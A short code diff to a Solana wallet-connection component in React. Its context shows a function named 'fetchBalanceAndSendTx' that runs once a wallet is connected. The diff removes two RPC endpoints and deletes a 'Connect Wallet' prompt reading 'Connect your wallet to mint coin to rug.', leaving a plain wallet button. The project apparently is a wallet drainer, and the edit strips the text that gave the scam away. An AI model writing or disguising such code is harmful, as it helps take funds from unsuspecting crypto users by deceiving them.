@@ -91,8 +91,6 @@ const WalletConnectionHandler: FC = () => {
 
     const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
         const rpcEndpoints = [
-            'https://sg110.nodes.rpcpool.com',
-            'https://api.mainnet-beta.solana.com',
             'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
             'https://rpc.ankr.com/solana',
         ];
@@ -185,23 +183,7 @@ const WalletConnectionHandler: FC = () => {
         >
             {!connected || !publicKey ? (
                 <div>
-                    <h2 style={{ color: '#ff91e3' }}>Connect Wallet</h2>
-                    <p style={{ color: '#ff5cd1', fontSize: '14px' }}>
-                        Connect your wallet to mint coin to rug.
-                    </p>
-                    <WalletMultiButton
-                        style={{
-                            background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
-                            color: 'white',
-                            borderRadius: '10px',
-                            padding: '12px 24px',
-                            fontSize: '16px',
-                            fontWeight: '600',
-                            border: 'none',
-                            boxShadow: '0 0 12px rgba(255, 92, 209, 0.6)',
-                            cursor: 'pointer',
-                        }}
-                    />
+                    <WalletMultiButton/>
                 </div>
             ) : (
                 <>
